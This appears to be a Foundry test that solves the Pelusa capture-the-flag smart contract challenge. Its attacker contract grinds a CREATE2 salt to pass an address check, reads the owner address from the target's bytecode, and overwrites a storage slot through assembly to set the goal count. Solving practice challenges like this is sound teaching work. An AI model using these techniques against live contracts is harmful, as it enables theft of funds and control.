// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Pelusa.sol";

contract PelAtk {
    Pelusa pelusa;
    uint256 public hello;

    constructor(address _pelusa) {
        pelusa = Pelusa(_pelusa);
        pelusa.passTheBall();
    }

    function getBallPossesion() external view returns (address) {
        bytes memory code = getBytecode(address(pelusa));
        return PelAtk(this).calldataCheese(code);
    }

    function shoot() external {
        pelusa.shoot();
    }

    function handOfGod() external returns (bytes32) {
        assembly {
            sstore(1, 2)
        }
        return bytes32(uint256(22_06_1986));
    }

    function calldataCheese(bytes calldata data) external pure returns (address) {
        return address(bytes20(data[356:376]));
    }

    function getBytecode(address target) public view returns (bytes memory code) {
        assembly {
            let size := extcodesize(target)
            code := mload(0x40)
            mstore(0x40, add(code, and(add(add(size, 0x20), 0x1f), not(0x1f))))
            mstore(code, size)
            extcodecopy(target, add(code, 0x20), 0, size)
        }
    }
}

contract PelusaTest is Test {
    Pelusa public pelusa;
    PelAtk public pelAtk;

    function setUp() public {
        pelusa = new Pelusa();
    }

    function testHack() public {
        /* Logic to compute the bytecode location of pelusa owner address
        // Assumes first character of address is different - needs manual check
        vm.prank(address(0));
        Pelusa diffPelusa = new Pelusa();
        bytes memory code1 = getBytecode(address(pelusa));
        bytes memory code2 = getBytecode(address(diffPelusa));
        console.log("first difference loc: %s", compareBytecode(code1, code2););
        */

        // Calculate an address that will work and deploy
        uint256 salt = computePassingSalt();
        pelAtk = new PelAtk{salt: bytes32(salt)}(address(pelusa));
        pelAtk.shoot();

        assertEq(pelusa.goals(), 2);
    }

    function computePassingSalt() public view returns (uint256) {
        uint256 salt = 0;
        address addr;

        // find an address that will pass the passTheBall() check
        while (uint256(uint160(addr)) % 100 != 10) {
            salt++;
            // create2 address calculation
            addr = address(
                uint160(
                    uint256(
                        keccak256(
                            abi.encodePacked(
                                bytes1(0xff),
                                address(this),
                                salt,
                                keccak256(abi.encodePacked(type(PelAtk).creationCode, abi.encode(address(pelusa))))
                            )
                        )
                    )
                )
            );
        }
        return salt;
    }

    // function getBytecode(
    //     address target
    // ) public view returns (bytes memory code) {
    //     assembly {
    //         let size := extcodesize(target)
    //         code := mload(0x40)
    //         mstore(0x40, add(code, and(add(add(size, 0x20), 0x1f), not(0x1f))))
    //         mstore(code, size)
    //         extcodecopy(target, add(code, 0x20), 0, size)
    //     }
    // }
    // function compareBytecode(
    //     bytes memory code1,
    //     bytes memory code2
    // ) public view returns (uint i) {
    //     // assuming they're same length
    //     for (i = 0; i < code1.length; i++) {
    //         if (code1[i] != code2[i]) {
    //             return i;
    //         }
    //     }
    // }
}
